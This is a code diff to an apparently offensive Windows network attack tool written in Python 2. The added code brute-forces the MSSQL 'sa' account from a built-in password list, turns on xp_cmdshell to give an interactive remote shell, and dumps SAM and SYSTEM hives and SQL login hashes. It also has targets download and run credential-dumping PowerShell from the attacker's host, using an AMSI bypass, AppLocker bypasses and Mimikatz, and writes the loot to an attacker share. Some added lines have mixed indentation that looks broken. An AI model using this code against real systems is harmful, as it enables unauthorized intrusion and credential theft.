@@ -2,6 +2,11 @@
 # -*- coding: utf-8 -*-
 
 #pip install pymssql
+import signal
+def handler(s, f):
+    print 'Signal handler called with signal', s
+    raise IOError("Couldn't connect!")
+signal.signal(signal.SIGALRM, handler)
 
 from deps.psexec import *
 from deps.wmiexec import *
@@ -101,6 +106,7 @@ pathNTDSExtract='/pentest/ntdsxtract/'
 optionMS14068=True
 optionTokenPriv=True
 
+domainAuthenticationOK=False
 amsiMode=False
 demo=False
 debugMode=False
@@ -157,6 +163,7 @@ compromisedHostList=[]
 
 powershellCmdStart='powershell -Sta -ep bypass -noninteractive -nologo -window hidden '
 powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
+
 class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
     pass
 
@@ -903,6 +910,239 @@ def runSQLQuery(hostNo,user,password,query):
     except pymssql.OperationalError:
         pass
     return tmpResultList
+    
+def bruteMSSQLCmd(hostNo,portNo):
+    wordList=[]
+    wordList.append("111111")
+    wordList.append("123456")
+    wordList.append("12345678")
+    wordList.append("1qaz2wsx")
+    wordList.append("2003")
+    wordList.append("2008")
+    wordList.append("95")
+    wordList.append("98")
+    wordList.append("Autumn2013")
+    wordList.append("Autumn2014")
+    wordList.append("Autumn2015")
+    wordList.append("Autumn2016")
+    wordList.append("Autumn2017")
+    wordList.append("P@55w0rd!")
+    wordList.append("P@55w0rd")
+    wordList.append("P@ssw0rd!")
+    wordList.append("P@ssw0rd")
+    wordList.append("P@ssword!")
+    wordList.append("PassSql12")
+    wordList.append("Password!")
+    wordList.append("Password1!")
+    wordList.append("Password1")
+    wordList.append("Password12")
+    wordList.append("Password2")
+    wordList.append("SQLSQLSQLSQL")
+    wordList.append("Spring2013")
+    wordList.append("Spring2014")
+    wordList.append("Spring2015")
+    wordList.append("Spring2016")
+    wordList.append("Spring2017")
+    wordList.append("SqlServer")
+    wordList.append("Sqlserver")
+    wordList.append("Summer2008")
+    wordList.append("Summer2009")
+    wordList.append("Summer2010")
+    wordList.append("Summer2011")
+    wordList.append("Summer2012")
+    wordList.append("Summer2013")
+    wordList.append("Summer2014")
+    wordList.append("Summer2015")
+    wordList.append("Summer2016")
+    wordList.append("Summer2017")
+    wordList.append("Welcome1212")
+    wordList.append("Welcome123")
+    wordList.append("Welcome1234")
+    wordList.append("Winter2008")
+    wordList.append("Winter2009")
+    wordList.append("Winter2010")
+    wordList.append("Winter2011")
+    wordList.append("Winter2012")
+    wordList.append("Winter2013")
+    wordList.append("Winter2014")
+    wordList.append("Winter2015")
+    wordList.append("Winter2016")
+    wordList.append("Winter2017")
+    wordList.append("abc")
+    wordList.append("abc123")
+    wordList.append("abcd123")
+    wordList.append("account")
+    wordList.append("admin")
+    wordList.append("adminadmin")
+    wordList.append("administator")
+    wordList.append("admins")
+    wordList.append("air")
+    wordList.append("alpine")
+    wordList.append("autumn2013")
+    wordList.append("autumn2014")
+    wordList.append("autumn2015")
+    wordList.append("autumn2016")
+    wordList.append("autumn2017")
+    wordList.append("bankbank")
+    wordList.append("baseball")
+    wordList.append("basketball")
+    wordList.append("bird")
+    wordList.append("burp")
+    wordList.append("change")
+    wordList.append("changelater")
+    wordList.append("changeme")
+    wordList.append("company!")
+    wordList.append("company")
+    wordList.append("company1!")
+    wordList.append("company1")
+    wordList.append("company123")
+    wordList.append("complex")
+    wordList.append("complex1")
+    wordList.append("complex2")
+    wordList.append("complex3")
+    wordList.append("complexpassword")
+    wordList.append("database")
+    wordList.append("default")
+    wordList.append("dev")
+    wordList.append("devdev")
+    wordList.append("devdevdev")
+    wordList.append("dirt")
+    wordList.append("dragon")
+    wordList.append("earth")
+    wordList.append("fire")
+    wordList.append("football")
+    wordList.append("goat")
+    wordList.append("god")
+    wordList.append("guessme")
+    wordList.append("hugs")
+    wordList.append("letmein")
+    wordList.append("login")
+    wordList.append("march2011")
+    wordList.append("master")
+    wordList.append("microsoft")
+    wordList.append("monkey")
+    wordList.append("network")
+    wordList.append("networking")
+    wordList.append("networks")
+    wordList.append("nt")
+    wordList.append("pass")
+    wordList.append("password!")
+    wordList.append("password")
+    wordList.append("password1")
+    wordList.append("password12")
+    wordList.append("password123")
+    wordList.append("password2")
+    wordList.append("princess")
+    wordList.append("private")
+    wordList.append("qa")
+    wordList.append("qwerty")
+    wordList.append("qwertyuiop")
+    wordList.append("rain")
+    wordList.append("sa")
+    wordList.append("sasa")
+    wordList.append("secret!")
+    wordList.append("secret")
+    wordList.append("secret1!")
+    wordList.append("secret12")
+    wordList.append("secret1212")
+    wordList.append("secret123")
+    wordList.append("secuirty3")
+    wordList.append("security")
+    wordList.append("security1")
+    wordList.append("security3")
+    wordList.append("server")
+    wordList.append("snow")
+    wordList.append("solo")
+    wordList.append("someday")
+    wordList.append("spring2013")
+    wordList.append("spring2014")
+    wordList.append("spring2015")
+    wordList.append("spring2016")
+    wordList.append("spring2017")
+    wordList.append("sql")
+    wordList.append("sql2000")
+    wordList.append("sql2003")
+    wordList.append("sql2005")
+    wordList.append("sql2008")
+    wordList.append("sql2009")
+    wordList.append("sql2010")
+    wordList.append("sql2011")
+    wordList.append("sqlaccount")
+    wordList.append("sqlpass")
+    wordList.append("sqlpass123")
+    wordList.append("sqlpassword")
+    wordList.append("sqlserver")
+    wordList.append("sqlserver2000")
+    wordList.append("sqlserver2005")
+    wordList.append("sqlsql")
+    wordList.append("sqlsqlsqlsql")
+    wordList.append("sqlsqlsqlsqlsql")
+    wordList.append("sqlsvr")
+    wordList.append("starwars")
+    wordList.append("summer2008")
+    wordList.append("summer2009")
+    wordList.append("summer2010")
+    wordList.append("summer2011")
+    wordList.append("summer2012")
+    wordList.append("summer2013")
+    wordList.append("summer2014")
+    wordList.append("summer2015")
+    wordList.append("summer2016")
+    wordList.append("summer2017")
+    wordList.append("sysadmin")
+    wordList.append("test")
+    wordList.append("test-sql3")
+    wordList.append("testing")
+    wordList.append("testing123")
+    wordList.append("testsql")
+    wordList.append("testtest")
+    wordList.append("trust")
+    wordList.append("unchanged")
+    wordList.append("unknown")
+    wordList.append("vista")
+    wordList.append("water")
+    wordList.append("welcome")
+    wordList.append("welcome1")
+    wordList.append("welcome2")
+    wordList.append("wicked")
+    wordList.append("winter2008")
+    wordList.append("winter2009")
+    wordList.append("winter2010")
+    wordList.append("winter2011")
+    wordList.append("winter2012")
+    wordList.append("winter2013")
+    wordList.append("winter2014")
+    wordList.append("winter2015")
+    wordList.append("winter2016")
+    wordList.append("winter2017")
+    wordList.append("xp")
+    query="USE master; select @@version"
+    continueNext=False
+    foundSAPassword=''
+    while continueNext==False:
+        for password in wordList:
+            tmpResultList=runSQLQuery(hostNo,'sa',password,query)
+            if len(tmpResultList)>0:
+                #tmpFooter=(setColor("[+]", bold, color="green"))+" "+hostNo+":445 | sa:"+password+" | "+(setColor("[MSSQL] [Bruteforce|Found Account]", bold, color="green"))
+                print (setColor("[+]", bold, color="green"))+" "+hostNo+":445 | "+(setColor("[MSSQL] [Bruteforce|Found Account]", bold, color="green"))+" | sa:"+password
+                username='sa'                
+                domain=''
+                foundSAPassword=password
+                status=checkXPCMDShell(hostNo,port,username,password,domain)
+                if status==False:
+                    enableXPCMDShell(hostNo,port,username,password,domain)
+                    continueNext=True
+                    break
+        continueNext=True
+    print (setColor("[+]", bold, color="green"))+" Enter '"+(setColor("exit", bold, color="green"))+"' to terminate session"
+    var=''
+    while var!='exit':
+        var = raw_input("> ")
+        query="exec master..xp_cmdshell '"+var+"'"
+        tmpResultList=runSQLQuery(hostNo,'sa',foundSAPassword,query)
+        for x in tmpResultList:
+            if x[0]!=None:
+                print x[0]
 
 def bruteMSSQLAuto(hostNo,portNo):
     wordList=[]
@@ -1132,15 +1372,36 @@ def bruteMSSQLAuto(hostNo,portNo):
                     print (setColor("[+]", bold, color="green"))+" "+hostNo+":445 | sa:"+password+" | "+(setColor("[Adding Local Admin Account]", bold, color="green"))+" | "+tmpCreateUsername+":"+tmpCreatePassword
                     if testAccountSilent(hostNo, 'WORKGROUP', tmpCreateUsername, tmpCreatePassword, None)==True:
                         print (setColor("[+]", bold, color="green"))+" "+hostNo+":445 | "+tmpCreateUsername+":"+tmpCreatePassword+" | "+(setColor("[Testing Access]", bold, color="green"))+(setColor(" [OK]", bold, color="blue"))
-                        tmppasswordHash=None
-                        tmpPasswordList=runMimikatz(hostNo,'WORKGROUP',tmpCreateUsername,tmpCreatePassword,tmppasswordHash)
-                        for y in tmpPasswordList:
-                            if y not in userPassList:
-                                userPassList.append(y)            
-                        #if len(tmpPasswordList)>0:
-                        #    print "\n"
-                        print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip
-                        tmpHashList=dumpDCHashes(hostNo,'WORKGROUP',tmpCreateUsername,tmpCreatePassword,tmppasswordHash)
+
+                        if getPowershellPath(hostNo,'WORKGROUP',tmpCreateUsername,tmpCreatePassword,None)==None:
+                            print (setColor("[+]", bold, color="green"))+" "+hostNo+":445 | "+tmpCreateUsername+":"+tmpCreatePassword+" | "+(setColor("[Powershell]", bold, color="green"))+" | Not Available"
+                            cmd = "reg save HKLM\SAM C:\\windows\\temp\\SAM /y"
+                            results,status=runWMIEXEC(hostNo, 'WORKGROUP', tmpCreateUsername, tmpCreatePassword, None, cmd)        
+                            cmd = "reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM /y"
+                            results,status=runWMIEXEC(hostNo, 'WORKGROUP', tmpCreateUsername, tmpCreatePassword, None, cmd)        
+                            cmd = "dir C:\\windows\\temp"
+                            results,status=runWMIEXEC(hostNo, 'WORKGROUP', tmpCreateUsername, tmpCreatePassword, None, cmd)        
+                            file1Location= downloadFile(hostNo,'WORKGROUP',tmpCreateUsername,tmpCreatePassword,'C:\\windows\\temp\\SYSTEM')
+                            file2Location= downloadFile(hostNo,'WORKGROUP',tmpCreateUsername,tmpCreatePassword,'C:\\windows\\temp\\SAM')
+                            print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+hostNo
+                            cmd = "python "+modulesDir+"/impacket/examples/secretsdump.py -system "+file1Location+" -sam "+file2Location+" LOCAL"
+                            resultList = runCommand(cmd, shell = True, timeout = 30)
+                            tmpResultList=resultList[1].split("\n")
+                            for y in tmpResultList:
+                                y=y.strip()
+                                if len(y)>0:
+                                    if "Core Security Technologies" not in y and "Cleaning up" not in y and "[*]" not in y:
+                                        print y
+                        else:
+                            tmppasswordHash=None
+                            tmpPasswordList=runMimikatz(hostNo,'WORKGROUP',tmpCreateUsername,tmpCreatePassword,tmppasswordHash)
+                            for y in tmpPasswordList:
+                                if y not in userPassList:
+                                    userPassList.append(y)            
+                            #if len(tmpPasswordList)>0:
+                            #    print "\n"
+                            print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip
+                            tmpHashList=dumpDCHashes(hostNo,'WORKGROUP',tmpCreateUsername,tmpCreatePassword,tmppasswordHash)
                     else:
                         print (setColor("[+]", bold, color="green"))+" "+hostNo+":445 | "+tmpCreateUsername+":"+tmpCreatePassword+" | "+(setColor("[Testing Access]", bold, color="green"))+" No Access"
                         print (setColor("[+]", bold, color="green"))+" "+hostNo+":445 | sa:"+password+" | "+(setColor("[Enable ADMIN Shares]", bold, color="green"))+" | Require Rebooting"
@@ -1426,17 +1687,30 @@ def dumpMSSQLHash(hostNo,port,username,password,domain):
         #for x in tmpResultList:
         #   print x.split("\t")
     else:
-        query="SELECT ''+ name + '\t' + password + ' ' FROM master.dbo.sysxlogins;"
-        if len(domain)>0:
-            tmpResultList=runSQLQuery(hostNo,domain+"\\"+username,password,query)
+        tmpResultList1=[]
+        if "2005" in str(tmpResultList):
+            query="SELECT name, master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins;"
+            if len(domain)>0:
+                tmpResultList=runSQLQuery(hostNo,domain+"\\"+username,password,query)
+            else:
+                tmpResultList=runSQLQuery(hostNo,username,password,query)
+            for x in tmpResultList:
+                tmpUsername=x[0]
+                tmpPasswordHash=x[1]
+                if tmpUsername!='##MS_PolicyEventProcessingLogin##' and tmpUsername!='##MS_PolicyTsqlExecutionLogin##':
+                    tmpResultList1.append([tmpUsername,tmpPasswordHash])                
         else:
-            tmpResultList=runSQLQuery(hostNo,username,password,query)
-    tmpResultList1=[]
-    for x in tmpResultList:
-        tmpUsername=x[0].split("\t")[0]
-        tmpPasswordHash=x[0].split("\t")[1]
-        if tmpUsername!='##MS_PolicyEventProcessingLogin##' and tmpUsername!='##MS_PolicyTsqlExecutionLogin##':
-            tmpResultList1.append([tmpUsername,tmpPasswordHash])
+            query="SELECT ''+ name + '\t' + password + ' ' FROM master.dbo.sysxlogins;"
+            if len(domain)>0:
+                tmpResultList=runSQLQuery(hostNo,domain+"\\"+username,password,query)
+            else:
+                tmpResultList=runSQLQuery(hostNo,username,password,query)
+            for x in tmpResultList:
+                tmpUsername=x[0].split("\t")[0]
+                tmpPasswordHash=x[0].split("\t")[1]
+                if tmpUsername!='##MS_PolicyEventProcessingLogin##' and tmpUsername!='##MS_PolicyTsqlExecutionLogin##':
+                    tmpResultList1.append([tmpUsername,tmpPasswordHash])
+    #tmpResultList1=[]
     if len(domain)>0:
         tmpFooter=(setColor("[+]", bold, color="green"))+" "+hostNo+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[MSSQL]", bold, color="green"))+" | Dump Credentials"
     else:
@@ -1460,7 +1734,10 @@ def dumpMSSQLIDF(hostNo,port,username,password,domain):
         #for x in tmpResultList:
         #   print x.split("\t")
     else:
-        query="SELECT ''+ name + '\t' + password + ' ' FROM master.dbo.sysxlogins;"
+        if "2005" in str(tmpResultList):
+            query="SELECT name, master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins;"
+        else:
+            query="SELECT ''+ name + '\t' + password + ' ' FROM master.dbo.sysxlogins;"
         if len(domain)>0:
             tmpResultList=runSQLQuery(hostNo,domain+"\\"+username,password,query)
         else:
@@ -1660,36 +1937,31 @@ def testDomainCredentials(username,password,passwordHash,ip,domain,silent):
             executer = WMIEXEC(command,username,password,domain,passwordHash,aesKey,share,nooutput,k,dc_ip)
             loginStatus=executer.run(ip)
             resultsOutput=executer.getOutput()
+            if debugMode==True:
+                print loginStatus
             if "STATUS_LOGON_FAILURE" in str(loginStatus):
                 if password!=None:
-                    if silent==False:
-                        print (setColor("[-]", bold, color="red"))+" "+ip+":445 | "+domain+"\\"+username+":"+password+" [Failed]"
+                    #if silent==False:
+                    #    print (setColor("[-]", bold, color="red"))+" "+ip+":445 | "+domain+"\\"+username+":"+password+" [Failed]"
                     return False,foundAdmin 
                 else:
-                    if silent==False:
-                        print (setColor("[-]", bold, color="red"))+" "+ip+":445 | "+domain+"\\"+username+":"+passwordHash+" [Failed]"
                     return False,foundAdmin 
             else:
-                if "rpc_s_access_denied" in str(loginStatus):
+                if 'rpc_s_access_denied' in str(loginStatus) or 'WBEM_E_ACCESS_DENIED' in str(loginStatus) or 'access_denied' in str(loginStatus).lower():
                     if password!=None:
-                        if silent==False:
-                            print (setColor("[+]", bold, color="green"))+" "+ip+":445 | "+domain+"\\"+username+":"+password+" [OK]"
                         return True,foundAdmin 
                     else:
-                        if silent==False:
-                            print (setColor("[+]", bold, color="green"))+" "+ip+":445 | "+domain+"\\"+username+":"+passwordHash+" [OK]"
                         return True,foundAdmin 
                 else:
-                    if password!=None:
-                        if silent==False:
-                            print (setColor("[+]", bold, color="green"))+" "+ip+":445 | "+domain+"\\"+username+":"+password+" [OK][Admin]"
-                        foundAdmin=True
-                        return True,foundAdmin 
+                    if "Errno" in str(loginStatus):
+                        return False,foundAdmin
                     else:
-                        if silent==False:
-                            print (setColor("[+]", bold, color="green"))+" "+ip+":445 | "+domain+"\\"+username+":"+passwordHash+" [OK][Admin]"
-                        foundAdmin=True
-                        return True,foundAdmin 
+                        if password!=None:
+                            foundAdmin=True
+                            return True,foundAdmin 
+                        else:
+                            foundAdmin=True
+                            return True,foundAdmin 
         except:
             return False,foundAdmin
 
@@ -1699,10 +1971,15 @@ def testDomainCredentials1(username,password,hostNo):
     password = ansi_escape.sub('', password)
     cmd = "rpcclient -U "+username+"%'"+password+"' "+hostNo+"  -c 'enumdomgroups'"
     resultList = runCommand(cmd, shell = True, timeout = 30)
-    if "group:" in str(resultList):
-        return True
-    else:
+    if debugMode==True:
+    	print cmd
+    if "NT_STATUS_LOGON_FAILURE" in str(resultList):
         return False
+    else:
+        if "group:[None] rid:[0x201]" in str(resultList):
+            return False
+        else:
+            return True
 
 def getDomainAdminUsers(username,password,hostNo):
     foundStatus=False
@@ -1711,7 +1988,6 @@ def getDomainAdminUsers(username,password,hostNo):
     resultList = runCommand(cmd, shell = True, timeout = 15)
     if debugMode==True:
         print cmd
-        print resultList
     list1 = resultList[1].split("\n")
     for x in list1:
         try:        
@@ -1900,7 +2176,7 @@ def parseMimikatzOutput(list1):
     return tmpPasswordList
 
 def analyzeHashes(hashList):
-    print (setColor("[+]", bold, color="green"))+" Analyzing Hashes for Patterns"
+    #print (setColor("[+]", bold, color="green"))+" Analyzing Hashes for Patterns"
     #Blank 31d6cfe0d16ae931b73c59d7e0c089c0
     #NoLM  aad3b435b51404eeaad3b435b51404ee
     tmpBlankHashList=[]
@@ -1922,7 +2198,7 @@ def analyzeHashes(hashList):
     for key, value in tmpHashList.iteritems():
         tmpResultList.append([key,value])
     if len(tmpResultList):
-        print "Password Hashes Used By the Below Accounts"
+        print (setColor("[+]", bold, color="green"))+" Password Hashes Used By the Below Accounts"
         print tabulate(tmpResultList)
     if len(tmpBlankHashList):
         print "\nAccounts Using BLANK Password"
@@ -2067,32 +2343,39 @@ def testAccount(targetIP, domain, username, password, passwordHash):
     if username!="guest":
         if domain==None or len(domain)<1:
             domain='WORKGROUP'
-        cmd='whoami'
+        cmd='ipconfig'
+    complete=False
+    results=''
+    status=''
+    while complete==False:
         results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, cmd) 
-        if 'STATUS_LOGON_FAILURE' in str(status):
-            if len(domain)>0:
-                print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" [Failed]"            
-            else:
-                print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+username+":"+password+" [Failed]"            
-            return False
-        elif 'rpc_s_access_denied' in str(status):
-            if len(domain)>0:
-                print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" [OK]"            
-            else:
-                print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+username+":"+password+" [OK]"            
-            return False        
-        else:
-            if len(domain)>0:
-                print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" [OK][Admin]"            
-            else:
-                print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+username+":"+password+" [OK][Admin]"            
-            return True
+        if debugMode==True:
+            print status
+        if targetIP in str(results):
+                print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" "+(setColor("[OK][ADMIN]", bold, color="green"))
+                domainAuthenticationOK=True
+                return True
+    	else:  
+            	if 'STATUS_LOGON_FAILURE' in str(status):
+                 	print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" [Failed]"            
+                	return False
+                elif 'rpc_s_access_denied' in str(status) or 'WBEM_E_ACCESS_DENIED' in str(status) or 'access_denied' in str(status).lower():
+                        print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" [OK]"            
+                        domainAuthenticationOK=True
+                        return False        
+            	else:
+                        if "can't start new thread" in str(status):
+			    return False
+                            #complete=True
+                        else:                      
+                            print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" [Failed]"            
+                            return False
 
 def testAccountSilent(targetIP, domain, username, password, passwordHash):
     if username!="guest":
         cmd='whoami'
         results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, cmd) 
-        if 'STATUS_LOGON_FAILURE' in str(status) or "rpc_s_access_denied" in str(status):
+        if 'STATUS_LOGON_FAILURE' in str(status) or 'rpc_s_access_denied' in str(status) or 'WBEM_E_ACCESS_DENIED' in str(status) or 'access_denied' in str(status).lower():
             return False
         else:
             return True
@@ -2236,6 +2519,117 @@ def updateMimiStaging(targetIP,domain,username,password,passwordHash):
             print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+(setColor("[mimikatz]", color="green"))+" | "+tmpDomain+"\\"+tmpUsername+":"+tmpPassword+(setColor(" [Found] ", bold, color="green"))                
         return tmpPasswordList
 
+def runHashes(targetIP,domain,username,password,passwordHash):
+    tmpPasswordList1=[]
+    tmpPasswordList=[]
+    results=''
+    if testAccountSilent(targetIP, domain, username, password, passwordHash)==True:
+        if domain==None or len(domain)<1:
+            domain='WORKGROUP'
+        command='systeminfo | findstr /B /C:"OS Name"'
+        results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash,command) 
+        if "Microsoft Windows 10" in str(results):
+            tmpPasswordList=updateMimiStaging(targetIP,domain,username,password,passwordHash)
+        else:
+            psAvailStatus=testPowershell(targetIP, domain, username, password, passwordHash)
+            if psAvailStatus==True:
+                powershellPath=getPowershellPath(targetIP,domain,username,password,passwordHash)
+                if obfuscatedMode==False:  
+                    if amsiMode==True:
+                        if password==None:
+                            print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+passwordHash+" | "+(setColor("[amsi][hashes] ", bold, color="green"))+"Dumping Hashes"
+                        else:
+                            print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[amsi][hashes] ", bold, color="green"))+"Dumping Hashes"
+                        tmpCmd='reg query "HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727" /v Version'
+                        results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash,tmpCmd)
+                        if '2.0.50727.4927' in results:
+                            command=powershellPath+" -Version 2 "+powershellArgs+" IEX \"(New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes.ps1\'); Get-PassHashes\""  
+                        else:
+                            amsiBypassStr="[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)"
+                            command=powershellPath+" "+powershellArgs+"-Command "+amsiBypassStr+"; IEX \"(New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes.ps1\'); Get-PassHashes\""  
+                    else:           
+                        if password==None:
+                            print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+passwordHash+" | "+(setColor("[hashes] ", bold, color="green"))+"Dumping Hashes"        
+                        else:
+                            print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[hashes] ", bold, color="green"))+"Dumping Hashes"        
+                        command=powershellPath+" "+powershellArgs+" IEX \"(New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes.ps1\'); Get-PassHashes\""                                          
+                else:
+                    if amsiMode==True:
+                        if password==None:
+                            print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+passwordHash+" | "+(setColor("[amsi][obfs][hashes] ", bold, color="green"))+"Dumping Hashes"
+                        else:
+                            print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[amsi][obfs][hashes] ", bold, color="green"))+"Dumping Hashes"
+                        tmpCmd='reg query "HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727" /v Version'
+                        results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash,tmpCmd)
+                        if '2.0.50727.4927' in results:
+                            command=powershellPath+" -Version 2 "+powershellArgs+" IEX \"(New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes-obfs.ps1\'); Get-PassHashes\""  
+                        else:
+                            amsiBypassStr="[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)"
+                            command=powershellPath+" "+powershellArgs+"-Command "+amsiBypassStr+"; IEX \"(New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes-obfs.ps1\'); Get-PassHashes\""  
+                    else:
+                        print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[obfs][hashes] ", bold, color="green"))+"Dumping Hashes"
+                        command=powershellPath+" "+powershellArgs+" IEX \"(New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes-obfs.ps1\'); Get-PassHashes\""  
+                if debugMode==True:
+                    print command
+                results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash,command) 
+                if "doesn't match OS architecture." in str(results):
+                    command=command.replace("\\SysWOW64\\","\\System32\\")
+                    results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash,command) 
+                temp_name = (next(tempfile._get_candidate_names()))+".txt"
+                f = open('/tmp/'+temp_name, 'w')
+                f.write(results) 
+                f.close()
+                tmpData = [line.strip() for line in open('/tmp/'+temp_name, 'r')]
+                if "This script contains malicious content and has been blocked by your antivirus" in str(tmpData):
+                    print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[amsi] ", bold, color="green"))+" Blocked by AMSI"
+                else:
+                    print results
+
+            else:        
+                if obfuscatedMode==False:           
+                    cmd=" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes.ps1\'); Get-PassHashes"
+                else:
+                    print (setColor("[*]", bold, color="blue"))+" "+targetIP+":445 | "+(setColor("[hashes][obfs]", color="green"))+" | Enable Powershell Obfuscation"
+                    cmd=" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes-obfs.ps1\'); Get-PassHashes | Out-File \\\\"+myIP+"\\guest\\"+targetIP+"_hashes.txt"    
+
+                if applockerBypass==True:
+                    newCmd=''
+                    randomCount=(randint(1, 2))
+                    if randomCount==1:
+                        newCmd=appLockerBypass2(targetIP, domain, username, password, passwordHash,cmd)
+                    if randomCount==2:
+                        newCmd=appLockerBypass3(targetIP, domain, username, password, passwordHash,cmd)
+                    if randomCount==3:
+                        newCmd=appLockerBypass4(targetIP, domain, username, password, passwordHash,cmd)
+                    if debugMode==True:                        
+                        print newCmd
+
+                    runWMIEXEC(targetIP, domain, username, password, passwordHash, newCmd) 
+                    tmpFilename=targetIP+"_hashes.txt" 
+                    foundFile=False
+                    resultsMimikatz=""
+                    while foundFile==False:
+                        tmpFilename1=origScriptPath+"/loot/"+tmpFilename
+                        if os.path.exists(tmpFilename1) and (os.stat(tmpFilename1).st_size != 0):
+                            tmpFilename2=convertWinToLinux(tmpFilename1)
+                            with open(tmpFilename2, 'r') as content_file:
+                                resultsMimikatz = content_file.read()
+                                foundFile=True
+                        else:
+                            time.sleep(2)
+                    cmd ='schtasks /query  /tn "microsoftschedulertest"'
+                    results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash,cmd) 
+                    if "Ready" in results:
+                        cmd ='schtasks /Delete /TN microsoftschedulertest /f'
+                        runWMIEXEC(targetIP, domain, username, password, passwordHash,cmd) 
+                    print resultsMimikatz
+        for x in tmpPasswordList:
+            tmpDomain=(x[0]).lower()
+            tmpUsername=(x[1]).lower()
+            tmpPassword=(x[2])
+            tmpPasswordList1.append([targetIP,tmpDomain,tmpUsername,tmpPassword])
+    return tmpPasswordList1
+
 def runMimikatz(targetIP,domain,username,password,passwordHash):
     tmpPasswordList1=[]
     tmpPasswordList=[]
@@ -2335,7 +2729,8 @@ def runMimikatz(targetIP,domain,username,password,passwordHash):
                         tmpDomain=(x[0]).lower()
                         tmpUsername=(x[1]).lower()
                         tmpPassword=x[2]
-                        tmpPasswordList1.append([targetIP,tmpDomain,tmpUsername,tmpPassword])
+                        if [targetIP,tmpDomain,tmpUsername,tmpPassword] not in tmpPasswordList1:
+                            tmpPasswordList1.append([targetIP,tmpDomain,tmpUsername,tmpPassword])
             else:        
                 if obfuscatedMode==False:           
                     cmd=" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds | Out-File \\\\"+myIP+"\\guest\\"+targetIP+"_mimikatz.txt"    
@@ -2418,7 +2813,8 @@ def runMimikatz(targetIP,domain,username,password,passwordHash):
             tmpDomain=(x[0]).lower()
             tmpUsername=(x[1]).lower()
             tmpPassword=(x[2])
-            tmpPasswordList1.append([targetIP,tmpDomain,tmpUsername,tmpPassword])
+            if [targetIP,tmpDomain,tmpUsername,tmpPassword] not in tmpPasswordList1:
+                tmpPasswordList1.append([targetIP,tmpDomain,tmpUsername,tmpPassword])
     return tmpPasswordList1
 
 def get_ip_address():
@@ -2742,8 +3138,8 @@ def listProcesses(targetIP,domain,username,password,passwordHash):
     command="tasklist /NH /FO csv"
     results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
     if debugMode==True:
-	print command
-	print results
+    	print command
+    	print results
     #tmpResultList1=results[0].split("\n")
     #tmpResultList2=[]
     #for x in tmpResultList1:
@@ -3038,15 +3434,15 @@ def diskCredDump(targetIP,domain,username,password,passwordHash):
             print (setColor("[*]", bold, color="blue"))+" "+targetIP+":445 | "+(setColor("[applocker]", color="green"))+" | AppLocker Bypass Technique 3"    
         if chosenNumber==3:
